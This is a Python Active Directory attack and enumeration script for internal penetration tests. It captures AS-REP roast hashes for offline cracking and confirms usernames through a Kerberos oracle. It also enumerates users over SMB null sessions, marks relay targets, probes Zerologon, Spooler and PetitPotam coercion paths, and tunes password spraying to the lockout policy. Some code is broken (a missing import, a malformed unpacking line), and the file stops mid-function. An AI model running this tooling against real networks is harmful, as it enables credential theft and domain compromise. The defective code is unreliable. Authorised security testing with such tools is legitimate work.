#!/usr/bin/env python3
"""
adenum.py - AD enumeration for internal PTs, designed for the no-creds start.

PHASE 1 (unauthenticated - zero lockout risk, zero auth events):
  * rootDSE read (pre-auth)      -> naming contexts, DC hostname, DC level
  * anonymous LDAP (if permitted) -> user list, AS-REP roastables, SPN accounts
  * AS-REP roasting over Kerberos -> hashcat lines, FIRST CREDS PATH
  * SMB null session (MSRPC)     -> user list fallback, password policy
  * lockout policy extraction     -> calibrates later password spraying

PHASE 2 (any valid creds -> DA recon):
  * full users/groups/computers/trusts/policy
  * AS-REP + Kerberoastable lists
  * high-value targets: DA members (incl. nested), delegation, GPO admins,
    unconstrained delegation hosts, DC list, ADCS templates (if present)

Usage:
  Phase 1:  python3 adenum.py --dc-ip 10.0.0.10 --domain corp.local [--users wl.txt]
  Phase 2:  python3 adenum.py --dc-ip 10.0.0.10 --domain corp.local -u jdoe -p 'Pass1!'
"""
import argparse
import socket
import sys
from datetime import datetime, timedelta, timezone

try:
    from ldap3 import Server, Connection, ALL, SUBTREE, ANONYMOUS, NTLM
except ImportError:
    sys.exit('[-] pip install ldap3')

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
except ImportError:
    sys.exit('[-] pip install impacket')

# ------------------------------------------------------------------ output

FINDINGS = []

# ANSI colors (auto-disabled when stdout is piped or NO_COLOR set)
import os as _os
if _os.environ.get('NO_COLOR') or not sys.stdout.isatty():
    _RED, _YEL, _GRN, _CYN, _BOLD, _RST = ('',) * 6
else:
    _RED, _YEL, _GRN, _CYN, _BOLD, _RST = ('\033[91m', '\033[93m', '\033[92m',
                                            '\033[96m', '\033[1m', '\033[0m')

def info(msg):  print('[*] ' + msg)
def good(msg):  print('[+] ' + msg)
def warn(msg):  print('[!] ' + msg)
def bad(msg):   print('[-] ' + msg)

# categories that are near-guaranteed wins -> red output
HIGH_WIN_CATS = {'zerologon', 'laps', 'gpp', 'asrep', 'spray', 'anon-ldap',
                 'null-smb', 'dns-axfr', 'snmp', 'petitpotam', 'spooler'}

def finding(cat, msg):
    FINDINGS.append((cat, msg))
    label = '[' + cat.upper() + ']'
    if cat in HIGH_WIN_CATS:
        # red+bold: near-guaranteed win (creds/DA path)
        print('  [>>] ' + _RED + _BOLD + ('%-14s %s' % (label, msg)) + _RST)
    else:
        print('  [>>] %-14s %s' % (label, msg))

# ------------------------------------------------------------------ utils

def filetime_to_dt(ft):
    if not ft:
        return None
    try:
        return datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=int(ft) / 10)
    except (ValueError, OverflowError, TypeError):
        return None

def interval_seconds(val):
    """Normalize AD interval attr (filetime int/str or str(timedelta)) to seconds."""
    if val in (None, '', 0, '0'):
        return None
    if isinstance(val, int):
        i = val
    else:
        s = str(val).strip()
        try:
            i = int(s)
        except ValueError:
            # str(timedelta): "1 day, 0:00:00" / "0:30:00" / timedelta.max
            import re
            m = re.match(r'^\s*-?\s*(?:(\d+)\s+days?,?\s*)?'
                         r'(?:(\d+):)?(\d+):(\d+(?:\.\d+)?)\s*$', s)
            if m:
                d, h, mi, se = m.groups()
                total = int(d or 0) * 86400 + int(h or 0) * 3600 + int(mi) * 60 + float(se)
                return None if int(d or 0) >= 999999999 else int(total)
            return None
    if i == -9223372036854775808:
        return None
    return abs(i) // 10000000

def human_interval(secs):
    if secs is None:
        return 'Not Set'
    if secs == 0:
        return 'None'
    d, r = divmod(secs, 86400)
    h, r = divmod(r, 3600)
    m = r // 60
    parts = []
    if d: parts.append('%d day%s' % (d, 's' if d > 1 else ''))
    if h: parts.append('%d hour%s' % (h, 's' if h > 1 else ''))
    if m or not parts: parts.append('%d minute%s' % (m, 's' if m > 1 else ''))
    return ' '.join(parts)

UAC_FLAGS = [
    (0x00000002, 'DISABLED'), (0x00000010, 'LOCKED'), (0x00000020, 'NOTREQD'),
    (0x00000080, 'CLEARTEXT'), (0x00000200, 'NORMAL'), (0x00001000, 'WORKSTATION'),
    (0x00002000, 'DC'), (0x00010000, 'NOEXPIRE'), (0x00040000, 'SMARTCARD'),
    (0x00080000, 'TRUSTED_DEL'), (0x00100000, 'NOT_DELEGATED'),
    (0x00200000, 'DES_ONLY'), (0x00400000, 'NO_PREAUTH'), (0x00800000, 'PW_EXPIRED'),
    (0x01000000, 'S4U_DEL'), (0x04000000, 'GBAC'),
]

def uac_names(uac):
    if not uac:
        return []
    return [n for m, n in UAC_FLAGS if uac & m]

def print_banner():
    print('=' * 60)


def p_info(msg):  # alias kept for API compat
    info(msg)


def p_good(msg):
    good(msg)


def p_warn(msg):
    warn(msg)


def p_bad(msg):
    bad(msg)


def p_finding(cat, msg):
    finding(cat, msg)


def first(entry, attr, default=None):
    vals = entry.entry_attributes_as_dict.get(attr) if hasattr(entry, 'entry_attributes_as_dict') else None
    if not vals:
        return default
    v = vals[0]
    return default if v is None else v

WELL_KNOWN_SIDS = {
    'S-1-1-0': 'Everyone', 'S-1-5-4': 'INTERACTIVE',
    'S-1-5-11': 'Authenticated Users', 'S-1-5-17': 'IUSR',
    'S-1-5-18': 'SYSTEM', 'S-1-5-19': 'LOCAL SERVICE', 'S-1-5-20': 'NETWORK SERVICE',
    'S-1-5-32-544': 'BUILTIN\\Administrators', 'S-1-5-32-545': 'BUILTIN\\Users',
}

# ------------------------------------------------------------------ phase 1

def check_ports(dc_ip):
    good('Port sweep on %s' % dc_ip)
    for port, name in [(88, 'Kerberos'), (389, 'LDAP'), (445, 'SMB'), (636, 'LDAPS'),
                       (135, 'RPC'), (464, 'Kerberos-pw'), (5985, 'WinRM')]:
        try:
            socket.create_connection((dc_ip, port), timeout=2).close()
            good('  %-14s %d/open' % (name, port))
        except OSError:
            bad('  %-14s %d/closed' % (name, port))

def rootdse(dc_ip, port=389):
    """Anonymous rootDSE read - works pre-auth even on hardened DCs."""
    info('Reading rootDSE (pre-auth readable on almost all DCs)')
    conn = base = None
    try:
        srv = Server(dc_ip, get_info=ALL, port=port, connect_timeout=5)
        conn = Connection(srv, authentication=ANONYMOUS, auto_bind=True)
        conn.search(search_base='', search_filter='(objectClass=*)',
                    search_scope='BASE', attributes=['*'])
        if conn.entries:
            e = conn.entries[0]
            d = e.entry_attributes_as_dict
            good('rootDSE:')
            for attr in ['dnsHostName', 'defaultNamingContext', 'ldapServiceName',
                         'supportedSASLMechanisms', 'currentTime', 'domainFunctionality']:
                if attr in d and d[attr]:
                    finding('rootdse', '%s = %s' % (attr, ', '.join(str(v) for v in d[attr])))
            if 'defaultNamingContext' in d and d['defaultNamingContext']:
                base = str(d['defaultNamingContext'][0])
            return conn, base
    except Exception as e:
        warn('rootDSE read failed: %s' % e)
        try:
            conn.unbind()
        except Exception:
            pass
    return None, None

def anon_enum_users(conn, base):
    """Anonymous user enumeration - works only if DC allows anonymous searches."""
    if conn is None or base is None:
        return {}
    info('Anonymous LDAP user enumeration...')
    users = {}
    try:
        conn.search(base, '(&(objectCategory=person)(objectClass=user))',
                    search_scope=SUBTREE,
                    attributes=['sAMAccountName', 'userAccountControl'])
        for e in conn.entries:
            try:
                sam = str(e.entry_attributes_as_dict['sAMAccountName'][0])
                uac = int(e.entry_attributes_as_dict.get('userAccountControl', [0])[0] or 0)
                users[sam] = uac
            except (KeyError, ValueError, TypeError):
                pass
        if users:
            good('%d users via anonymous LDAP' % len(users))
            finding('anon-ldap', '%d users enumerable anonymously (users list saved)' % len(users))
        else:
            warn('Anonymous search returned no users (typical on hardened DCs)')
    except Exception as e:
        warn('Anonymous user search failed: %s' % e)
    return users

def anon_roastable_spn(conn, base):
    """AS-REP roastable + SPN accounts via anonymous LDAP."""
    if conn is None or base is None:
        return [], []
    asrep, spn = [], []
    try:
        conn.search(base,
                    '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
                    search_scope=SUBTREE, attributes=['sAMAccountName'])
        asrep = [str(e.entry_attributes_as_dict['sAMAccountName'][0]) for e in conn.entries]
        if asrep:
            good('AS-REP roastable users via anonymous LDAP: %s' % ', '.join(asrep))
            finding('asrep', 'AS-REP roastable via anon LDAP: %s' % ', '.join(asrep))
    except Exception as e:
        warn('AS-REP anon search failed: %s' % e)
    try:
        conn.search(base, '(&(objectClass=user)(servicePrincipalName=*))',
                    search_scope=SUBTREE,
                    attributes=['sAMAccountName', 'servicePrincipalName'])
        for e in conn.entries:
            try:
                sam = str(e.entry_attributes_as_dict['sAMAccountName'][0])
                spns = e.entry_attributes_as_dict.get('servicePrincipalName', [])
                spn.append((sam, [str(s) for s in spns]))
            except KeyError:
                pass
        if spn:
            good('%d SPN accounts (kerberoast targets) via anonymous LDAP' % len(spn))
            finding('kerberoast', 'SPN accounts via anon LDAP: %s'
                    % ', '.join(s for s, _ in spn[:20]))
    except Exception as e:
        warn('SPN anon search failed: %s' % e)
    return asrep, spn

def asrep_roast(dc_ip, domain, users):
    """Kerberos AS-REP roasting - hashcat lines for no-preauth users. No lockout risk."""
    hashes = []
    if not users:
        return hashes
    info('AS-REP roasting %d candidate(s) over Kerberos (no lockout risk)' % len(users))
    for user in users:
        try:
            tgt, _, _, _ = getKerberosTGT(user, '', domain, dc_ip)
            cipher = tgt['enc-part']['cipher'].asOctets()
            etype = int(tgt['enc-part']['etype'])
            if etype in (17, 18):
                line = '$krb5asrep$%d$%s@%s:%s$%s' % (etype, user, domain,
                                                      cipher[:16].hex(), cipher[16:].hex())
            else:
                line = '$krb5asrep$%s@%s:%s$%s' % (user, domain,
                                                   cipher[:16].hex(), cipher[16:].hex())
            hashes.append(line)
            good('AS-REP hash captured: %s (crack offline -> first creds)' % user)
            finding('asrep', 'AS-REP hash for %s saved - crack with hashcat -m 18200' % user)
        except KerberosError as e:
            err = str(e)
            if 'PREAUTH_REQUIRED' in err or 'PREAUTH' in err:
                pass  # normal user, requires preauth
            elif 'CLIENT_NOT_FOUND' in err:
                pass  # user doesn't exist (wordlist noise)
            else:
                warn('  %s: %s' % (user, err.split(chr(10))[0]))
        except Exception as e:
            warn('  %s: %s' % (user, e))
    return hashes

def smb_null_session(dc_ip, domain):
    """SMB null session user enumeration via MSRPC SAMR + pwd policy."""
    info('SMB null session check (MSRPC SAMR)...')
    users = {}
    try:
        from impacket.dcerpc.v5 import transport, samr
        rpctransport = transport.SMBTransport(dc_ip, 445, r'\samr')
        rpctransport.set_credentials('', '', domain)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        # OpenDomain on builtin domain (2) then enumerate... simplified: try server handle
        resp = samr.hSamrConnect(dce)
        server_handle = resp['ServerHandle']
        try:
            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=None, desiredAccess=samr.MAXIMUM_ALLOWED)
        except Exception:
            # enumerate domains first
            doms = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
            names = [d['Name'] for d in doms['Buffer']['Buffer2']]
            info('  SAMR domains: %s' % ', '.join(str(n) for n in names))
            if not names:
                return users
            resp = samr.hSamrLookupDomain(dce, server_handle, names[0])
            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=resp['DomainId'],
                                        desiredAccess=samr.MAXIMUM_ALLOWED)
        domain_handle = resp['DomainHandle']
        finding('null-smb', 'SMB null session SAMR access works - full user enumeration!')
        # enumerate users
        ctx = 0
        while True:
            try:
                enum = samr.hSamrEnumerateUsersInDomain(dce, domain_handle,
                                                        userType=0, enumerationContext=ctx)
            except Exception:
                break
            for u in enum['Buffer']['Buffer2']:
                name = str(u['Name'])
                users[name] = int(u['RelativeId'])
            ctx = enum['EnumerationContext']
            if not enum['Buffer']['Buffer2']:
                break
        if users:
            good('%d users via SMB null session' % len(users))
        # password policy via SamrQueryInformationDomain
        try:
            qi = samr.hSamrQueryInformationDomain(dce, domain_handle, 0)  # lockout info
        except Exception:
            pass
        dce.disconnect()
    except ImportError:
        warn('impacket not installed - skipping SMB null session')
    except Exception as e:
        info('SMB null session not available: %s' % str(e).split(chr(10))[0])
    return users


def network_sweep(cidr_or_ip, domain):
    """
    Network-level recon. TCP port sweep of the subnet + per-host service recon:
      - SMB: signing status (relay targets), OS, hostname, domain, SMBv1
      - HTTP: server headers, auth walls
    No authentication performed anywhere - pure pre-auth recon.
    """
    import concurrent.futures
    from ipaddress import ip_network, ip_address

    p_info('Network sweep: %s' % cidr_or_ip)
    try:
        if '/' in cidr_or_ip:
            hosts = [str(ip) for ip in ip_network(cidr_or_ip, strict=False).hosts()]
        else:
            hosts = [cidr_or_ip]
    except ValueError as e:
        p_warn('Invalid target: %s' % e)
        return {'alive': [], 'signing_off': [], 'smbv1': [], 'hosts': {}}

    # ---- TCP sweep: top AD/internal ports
    PORTS = [53, 88, 135, 139, 161, 389, 445, 464, 514, 636, 1433, 1521, 3268, 3269,
             3389, 5432, 5985, 5986, 6379, 8080, 8443, 9250, 47001, 4243,
             80, 443, 3000, 5000, 7001, 8000, 8888, 9000, 9090, 15672,
             4443, 8081]
    WEB = {80: 'HTTP', 443: 'HTTPS', 8080: 'HTTP-alt', 8443: 'HTTPS-alt'}

    def scan_host(ip):
        open_ports = []
        for port in PORTS:
            try:
                s = socket.create_connection((ip, port), timeout=0.5)
                s.close()
                open_ports.append(port)
            except OSError:
                pass
        return ip, open_ports

    alive = []
    hostinfo = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=64) as ex:
        for ip, open_ports in ex.map(scan_host, hosts):
            if open_ports:
                alive.append(ip)
                hostinfo[ip] = {'ports': open_ports}
                p_info('%-16s ports: %s' % (ip, ','.join(map(str, open_ports))))
    p_good('%d alive hosts' % len(alive))

    # -------- SMB recon per host: signing, SMBv1, OS, hostname, MS17-010 markers
    signing_off = []
    smbv1_hosts = []
    from impacket.smbconnection import SMBConnection, SMB2_DIALECT_002
    for ip in alive:
        if 445 not in hostinfo[ip]['ports'] and 139 not in hostinfo[ip]['ports']:
            continue
        # SMBv1 dialect check via raw NEGOTIATE
        try:
            s = socket.create_connection((ip, 445), timeout=2)
            # NBSS session setup + SMB1 negotiate
            negotiate = (b'\xffSMB' + b'\x72' + b'\x00'*32 +
                         b'\x02' + b'\x02' + b'\x00'*26)
            pkt = b'\x00\x00\x00\x85' + negotiate
            s.sendall(pkt)
            resp = s.recv(2048)
            s.close()
            if resp and resp[4:5] == b'\x72' and len(resp) > 40:
                p_info('%-16s SMBv1 dialect ACCEPTED (EternalBlue-era surface)' % ip)
                finding('smbv1', '%s accepts SMBv1 - MS17-010 surface, legacy clients' % ip)
                smbv1_hosts.append(ip)
        except OSError:
            pass
        # SMB2 signing check + info
        try:
            smbconn = SMBConnection(ip, ip, sess_port=445, preferredDialect=SMB2_DIALECT_002)
            try:
                os_name = smbconn.getServerOS()
                dom, host = '', ''
                try:
                    dom = smbconn.getServerDomain()
                    host = smbconn.getServerName()
                except Exception:
                    pass
                signing = smbconn.isSigningRequired()
                p_info('%-16s SMB2 OS=%-32s host=%-16s dom=%s signing=%s'
                       % (ip, os_name, host, dom, signing))
                if not signing:
                    finding('relay', 'SMB signing NOT required on %s (%s %s) -> RELAY TARGET'
                            % (ip, host or '?', os_name))
                    signing_off.append(ip)
                if os_name and any(x in str(os_name).lower() for x in ('2003', '2008', 'xp', 'windows 7', 'windows 7 ')):
                    finding('legacy', 'Legacy OS on %s: %s' % (ip, os_name))
                if dom and domain and dom.lower() not in (domain.lower(), domain.lower().split('.')[0]):
                    finding('domain', 'Host %s reports domain: %s' % (ip, dom))
            finally:
                try:
                    smbconn.close()
                except Exception:
                    pass
        except Exception as e:
            p_info('%-16s SMB2 negotiation failed: %s' % (ip, str(e).split(chr(10))[0][:50]))

    # -------- HTTP/web-app recon: titles, fingerprints, known internal apps
    WEB_PORTS = (80, 443, 3000, 4443, 5000, 7001, 8000, 8080, 8081, 8443, 8888,
                 9000, 9090, 15672)
    for ip in alive:
        for port in hostinfo[ip]['ports']:
            if port not in WEB_PORTS:
                continue
            try:
                s = socket.create_connection((ip, port), timeout=3)
                s.sendall(b'GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n'
                          b'Accept: */*\r\nConnection: close\r\n\r\n' % ip.encode())
                chunks = b''
                try:
                    while len(chunks) < 8192:
                        c = s.recv(4096)
                        if not c:
                            break
                        chunks += c
                except OSError:
                    pass
                s.close()
                resp = chunks.decode('utf-8', 'replace')
                if not resp:
                    continue
                head, _, body = resp.partition('\r\n\r\n')
                status = head.split(' ')[1] if len(head.split(' ')) > 1 else '?'
                server = ''
                for line in head.splitlines():
                    if line.lower().startswith('server:'):
                        server = line.split(':', 1)[1].strip()
                    if line.lower().startswith('location:'):
                        loc = line.split(':', 1)[1].strip()
                        p_info('%-16s:%-4d redirect %s -> %s' % (ip, port, status, loc))
                # title
                import re as _re
                tmatch = _re.search(r'<title[^>]*>(.*?)</title>', body, _re.I | _re.S)
                title = tmatch.group(1).strip()[:70] if tmatch else ''
                locl = body.lower()
                base = '%s:%d' % (ip, port)
                p_info('%-16s:%-4d HTTP %s %-25s %s' % (ip, port, status, server, title))
                # fingerprint known internal apps
                apps = [
                    ('tomcat',        'manager/html' in locl or 'tomcat' in (server + title).lower(),
                     'Tomcat - try /manager/html default creds'),
                    ('jenkins',       'jenkins' in (server + title).lower() or '/jenkins' in locl,
                     'Jenkins - check unauth /script, CVE-2024-23897 (CLI)'),
                    ('gitlab',        'gitlab' in (server + title).lower(),
                     'GitLab - check signup enabled, public repos'),
                    ('grafana',       'grafana' in (server + title).lower(),
                     'Grafana - default admin/admin, anon dashboards'),
                    ('kibana',        'kibana' in (server + title).lower() or '"kbn"' in locl,
                     'Kibana - data exposure via .kibana'),
                    ('elasticsearch', 'you know, for search' in locl or 'elasticsearch' in server.lower(),
                     'Elasticsearch - usually unauth API, full data read'),
                    ('jira/confluence', 'confluence' in locl or 'jira' in locl or 'confluence' in (server + title).lower(),
                     'Confluence - CVE-2023-22515 (setup wizard), CVE-2024-21683 RCE'),
                    ('nexus',         'nexus repository' in locl,
                     'Nexus Repo - anon browse, CVE-2024-4956 path traversal'),
                    ('jenkins-cli',   'x-jenkins' in locl or 'x-jenkins' in head.lower(),
                     'Jenkins version header - check CVEs'),
                    ('phpmyadmin',    'phpmyadmin' in locl,
                     'phpMyAdmin - brute surface'),
                    ('wordpress',     'wp-content' in locl or 'wp-login' in locl,
                     'WordPress - wpscan, plugin vulns'),
                    ('git-exposed',   'ref: refs/' in locl or '.git/config' in locl,
                     'Git repo exposure?'),
                ]
                for name, hit, note in apps:
                    if hit:
                        finding('webapp', '%s on %s - %s' % (name, base, note))
                # generic but valuable: auth wall = spray target
                if status == '401':
                    finding('webapp', 'HTTP 401 on %s - auth surface (basic/NTLM? spray/relay target)' % base)
                # IIS generic
                if server and 'iis' in server.lower() \
                        and 'exchange' not in (server + title).lower() \
                        and 'outlook' not in (server + title).lower():
                    finding('webapp', 'IIS on %s - check /owa /ecp /autodiscover /aspnet_client' % base)
                # directory listing exposed
                if 'index of /' in title.lower() or 'directory listing' in locl \
                        or 'index of' in title.lower():
                    finding('webapp', 'Directory listing exposed on %s (%s)' % (base, title))
                # IIS/Exchange (title or server markers)
                if server or title:
                    st = (server + ' ' + title).lower()
                    if 'exchange' in st or 'owa' in st or 'outlook' in st:
                        finding('webapp', 'Exchange/OWA on %s (%s %s) -> relay target + spray surface'
                                % (base, server, title))
            except OSError:
                pass

    # -------- SNMP easy win: community 'public'
    for ip in alive:
        if 161 not in hostinfo[ip]['ports']:
            continue
        try:
            from pysnmp.hlapi import (CommunityData, UdpTransportTarget, getCmd,
                                      ObjectType, ObjectIdentity, ContextData)
            iterator = getCmd(SnmpEngine(), CommunityData('public', mpModel=0),
                              UdpTransportTarget((ip, 161), timeout=2),
                              ContextData(), ObjectType(ObjectIdentity('1.3.6.1.2.1.1.1.0')))
            next(iterator)
            finding('snmp', 'SNMP community "public" on %s - full device inventory leak' % ip)
        except ImportError:
            break
        except Exception:
            pass

    return {'alive': alive, 'signing_off': signing_off, 'smbv1': smbv1_hosts, 'hosts': hostinfo}


def kerb_user_oracle(dc_ip, domain, users):
    """
    Kerberos username oracle: sends AS-REQ without preauth.
    KDC_ERR_PREAUTH_REQUIRED  -> user EXISTS (response leaks user is real)
    KDC_ERR_C_PRINCIPAL_UNKNOWN -> user does NOT exist
    Does not count as failed auth, does not lock accounts.
    """
    valid = []
    p_info('Kerberos username oracle (%d candidates)' % len(users))
    try:
        from impacket.krb5.kerberosv5 import sendReceive
        from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST
        from pyasn1.codec.der import decoder as der_decoder, encoder as der_encoder
        from pyasn1.type.univ import noValue
        from impacket.krb5 import constants as krb_constants
        from impacket.krb5.types import Principal
        import random as _random
    except ImportError:
        p_warn('impacket/pyasn1 missing - skipping Kerberos oracle')
        return valid
    for user in users:
        try:
            cname = Principal(user, type=krb_constants.PrincipalNameType.NT_PRINCIPAL.value)
            as_req = AS_REQ()
            as_req['pvno'] = 5
            as_req['msg-type'] = int(krb_constants.ApplicationTagNumbers.AS_REQ.value)
            pac = KERB_PA_PAC_REQUEST()
            pac['include-pac'] = False
            as_req['padata'] = noValue
            as_req['padata'][0] = noValue
            as_req['padata'][0]['padata-type'] = int(krb_constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
            as_req['padata'][0]['padata-value'] = der_encoder.encode(pac)
            body = as_req['req-body']
            body['realm'] = domain.upper()
            from impacket.krb5.types import KerberosTime
            import datetime as _dt
            now = _dt.datetime.now(_dt.timezone.utc) + _dt.timedelta(days=1)
            body['till'] = KerberosTime.to_asn1(now)
            body['nonce'] = _random.getrandbits(31)
            from pyasn1.type.univ import Integer
            body['etype'] = [23, 18, 17]
            body['cname'] = cname.components_to_asn1
            server = Principal('krbtgt/%s' % domain.upper(),
                               type=krb_constants.PrincipalNameType.NT_PRINCIPAL.value)
            body['sname'] = server.components_to_asn1
            msg = der_encoder.encode(as_req)
            sendReceive(msg, domain, dc_ip)
            # got an actual AS-REP back: no-preauth user!
            valid.append(user)
            p_good('VALID (no-preauth!): %s' % user)
            finding('userenum', 'User EXISTS via Kerberos oracle: %s (no preauth = roastable!)' % user)
        except KerberosError as e:
            if 'PRINCIPAL_UNKNOWN' in str(e):
                pass
            elif 'PREAUTH_REQUIRED' in str(e) or 'PREAUTH' in str(e):
                valid.append(user)
                p_good('User EXISTS via Kerberos oracle: %s' % user)
            else:
                p_info('  %s: %s' % (user, str(e).split(chr(10))[0][:60]))
        except Exception as e:
            p_info('  %s: %s' % (user, str(e).split(chr(10))[0][:60]))
    if valid:
        finding('userenum', '%d valid usernames confirmed via Kerberos oracle (no lockout)' % len(valid))
    return valid


def dns_recon(dc_ip, domain):
    """DNS recon: SRV records (DCs, GC, kerberos, ldap), A records, AXFR attempt."""
    import dns.resolver
    srvs = {}
    info('DNS SRV lookup via %s' % dc_ip)
    resolver = dns.resolver.Resolver(configure=False)
    resolver.nameservers = [dc_ip]
    resolver.lifetime = 3
    for label in ['_ldap._tcp', '_kerberos._tcp', '_kpasswd._tcp', '_gc._tcp']:
        name = '%s.%s' % (label, domain) if not label.startswith('_ldap._tcp.dc._msdcs') else label
        try:
            answers = resolver.resolve('%s.%s' % (label, domain), 'SRV')
            for r in answers:
                target = str(r.target).rstrip('.')
                srvs.setdefault(label, []).append((str(r.target).rstrip('.').lower(), r.port))
                p_good('SRV %s.%s -> %s:%d' % (label, domain, target, r.port))
        except Exception:
            pass
    # DC list via _ldap._tcp.dc._msdcs
    try:
        answers = resolver.resolve('_ldap._tcp.dc._msdcs.%s' % domain, 'SRV')
        dcs = sorted(set(str(r.target).rstrip('.').lower() for r in answers))
        if dcs:
            finding('dc-list', 'Domain controllers via DNS SRV: %s' % ', '.join(dcs))
            srvs['dc'] = dcs
    except Exception:
        pass
    # AXFR attempt (zone transfer - often forgotten on internal DNS)
    try:
        import dns.query as dns_query
        import dns.zone as dns_zone
        from dns.exception import DNSException
        xfr = dns_zone.from_xfr(dns_query.xfr(dc_ip, domain, lifetime=8))
        names = sorted(n.to_text() for n in xfr.nodes if n != xfr.origin)[:40]
        p_good('DNS AXFR SUCCESS - %d records (first 40):' % len(xfr.nodes))
        for n in names:
            p_finding('dns-axfr', n)
        finding('dns-axfr', 'Zone transfer ALLOWED from %s - full internal host inventory' % dc_ip)
    except Exception:
        p_info('AXFR denied (normal)')
    return srvs


def check_zerologon(dc_ip):
    """
    CVE-2020-1472 Zerologon check (NON-DESTRUCTIVE detection only):
    attempts NetrServerReqChallenge + NetrServerAuthenticate2 with 8 null bytes.
    If the DC accepts the null machine-account key setup, it's vulnerable.
    We do NOT attempt the actual exploit (no NetrServerPasswordSet2).
    Detection = 5-6 MSRPC calls, safe, no changes on the DC.
    """
    p_info('Zerologon (CVE-2020-1472) check - non-destructive detection')
    try:
        from impacket.dcerpc.v5 import nrpc, transport
    except ImportError:
        p_warn('impacket missing - skipping')
        return False
    try:
        binding = r'ncacn_np:%s[\pipe\netlogon]' % dc_ip
        rpc = transport.DCERPCTransportFactory(binding)
        rpc.set_credentials('', '', '')
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        dcname = None
        # get DC netbios name via SMB or assume
        try:
            from impacket.smbconnection import SMBConnection
            smb = SMBConnection(dc_ip, dc_ip)
            dcname = smb.getServerName()
            smb.close()
        except Exception:
            dcname = 'DC'
        for attempt in range(3):
            try:
                server = '\\\\' + dcname
                challenge_resp = nrpc.hNetrServerReqChallenge(dce, server + '\x00', 'CHAL\x00' * 2, b'\x00' * 8)
                # now authenticate with zeroed credential
                auth = nrpc.hNetrServerAuthenticate2(dce, server + '\x00', dcname + '$\x00',
                    nrpc.MSRPC_NegotiateFlags | 0x100, b'\x00' * 8, b'\x00' * 8)
                # if we get here without session_error, DC accepted null session key
                finding('zerologon', 'ZerOLOGON VULNERABLE on %s (%s) - instant DA via null machine key' % (dc_ip, dcname))
                dce.disconnect()
                return True
            except nrpc.SessionError as e:
                # expected: STATUS_ACCESS_DENIED for patched DCs
                err = e.get_error_code()
                if 'denied' in str(e).lower():
                    p_good('Patched (rejected null session key)')
                    dce.disconnect()
                    return False
                raise
            except Exception as e:
                raise
    except Exception as e:
        p_info('Zerologon check failed/inconclusive: %s' % str(e).split(chr(10))[0][:80])
    return False


def check_spooler(dc_ip):
    r"""
    Print Spooler (PrinterBug) check: if the spooler service is running, an
    unauthenticated attacker can coerce the DC to authenticate to us (relayed).
    Detection: open \pipe\spoolss on the DC - no print jobs submitted.
    """
    p_info('Spooler (PrinterBug) check - \\pipe\\spoolss reachable?')
    try:
        from impacket.dcerpc.v5 import transport, rprn
        binding = r'ncacn_np:%s[\pipe\spoolss]' % dc_ip
        rpc = transport.DCERPCTransportFactory(binding)
        dce = rpc.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
        finding('spooler', 'Print Spooler ENABLED on %s -> PrinterBug coercion to force DC auth' % dc_ip)
        dce.disconnect()
        return True
    except Exception as e:
        p_info('Spooler not exposed (%s)' % str(e).split(chr(10))[0][:60])
    return False


def check_petitpotam(dc_ip):
    """
    PetitPotam (EfsRpcOpenFileRaw) coercion check: if the EFSRPC pipe accepts
    unauthenticated connections, we can coerce host auth to our listener.
    Detection only - no coercion performed.
    """
    p_info('PetitPotam (EFSRPC) coercion check')
    exposed = False
    try:
        from impacket.dcerpc.v5 import transport, epm
        # try the classic paths
        for pipe in (r'\pipe\lsarpc', r'\pipe\efsrpc', r'\pipe\samr', r'\pipe\lsass'):
            try:
                binding = r'ncacn_np:%s[%s]' % (dc_ip, pipe)
                rpc = transport.DCERPCTransportFactory(binding)
                dce = rpc.get_dce_rpc()
                dce.connect()
                dce.disconnect()
                if pipe == r'\pipe\efsrpc':
                    finding('petitpotam', 'EFSRPC pipe \\pipe\\efsrpc exposed on %s -> PetitPotam coercion possible' % dc_ip)
                    exposed = True
                break
            except Exception:
                continue
    except Exception:
        pass
    if not exposed:
        p_info('No direct \\pipe\\efsrpc - check lsarpc for EfsRpcOpenFileRaw support (often still works)')
    return exposed


def easy_wins_phase1(dc_ip, domain, sweep):
    """All unauthenticated easy wins in one pass."""
    p_info('=== EASY WINS SWEEP (unauthenticated) ===')
    check_zerologon(dc_ip)
    check_spooler(dc_ip)
    check_petitpotam(dc_ip)


def print_policy(policy_attrs):
    """Print + flag password policy from domain policy entry dict."""
    def g(k):
        v = policy_attrs.get(k)
        return v[0] if isinstance(v, list) and v else v
    good('Password policy:')
    good('  min length:        %s' % g('minPwdLength'))
    good('  history:          %s' % g('pwdHistoryLength'))
    good('  max age:          %s' % human_interval(interval_seconds(g('maxPwdAge'))))
    good('  min age:          %s' % human_interval(interval_seconds(g('minPwdAge'))))
    good('  lockout duration: %s' % human_interval(interval_seconds(g('lockoutDuration'))))
    good('  lockout window:   %s' % human_interval(interval_seconds(g('lockOutObservationWindow'))))
    good('  lockout threshold:%s' % g('lockoutThreshold'))
    complex = int(g('pwdProperties') or 0) & 1
    good('  complexity:       %s' % ('required' if complex else 'not required'))
    if g('lockoutThreshold') not in (None, 0, '0'):
        finding('spray-cal', 'Lockout threshold %s, window %s - spray carefully'
                % (g('lockoutThreshold'), human_interval(interval_seconds(g('lockOutObservationWindow')))))
    if g('lockoutThreshold') in (0, '0'):
        finding('spray', 'NO ACCOUNT LOCKOUT (threshold=0) - unlimited password spraying!')
    if not complex:
        finding('spray', 'Password complexity NOT required - simple spray lists viable')

# ------------------------------------------------------------------ phase 2

def authed_enum(dc_ip, domain, username, password, base_dn, port=389):
    info('Authenticated enumeration as %s' % username)
    dom, _, _ = (domain.partition('.'), None, None)[0]
    fqdn = domain
    user = '%s\\%s' % (dom.upper(), username)
    try:
